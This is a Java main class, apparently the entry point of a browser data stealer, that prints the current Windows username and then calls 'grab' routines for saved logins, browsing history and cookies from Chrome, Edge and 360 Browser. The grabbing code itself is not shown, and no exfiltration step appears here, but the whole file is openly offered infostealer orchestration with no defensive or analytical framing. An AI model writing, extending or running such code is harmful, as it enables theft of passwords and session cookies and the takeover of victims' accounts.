package ninja.maki;

import ninja.maki.grabber.broswer360.Broswer360Login;
import ninja.maki.grabber.broswer360.Browser360Cookie;
import ninja.maki.grabber.broswer360.Browser360History;
import ninja.maki.grabber.chrome.ChromeCookie;
import ninja.maki.grabber.chrome.ChromeHistory;
import ninja.maki.grabber.chrome.ChromeLogin;
import ninja.maki.grabber.edge.EdgeCookie;
import ninja.maki.grabber.edge.EdgeHistory;
import ninja.maki.grabber.edge.EdgeLogin;
import ninja.maki.utils.SystemUtil;

public class Main {
    public static void main(String[] args){
        SystemUtil.console("Starting program.");
        SystemUtil.console();
        SystemUtil.console("Current User -> " + System.getenv("USERNAME"));
        ChromeLogin.grab();
        ChromeHistory.grab();
        ChromeCookie.grab();
        EdgeLogin.grab();
        EdgeHistory.grab();
        EdgeCookie.grab();
        Broswer360Login.grab();
        Browser360History.grab();
        Browser360Cookie.grab();
        SystemUtil.console();
        SystemUtil.console("Stop program.");
    }
}
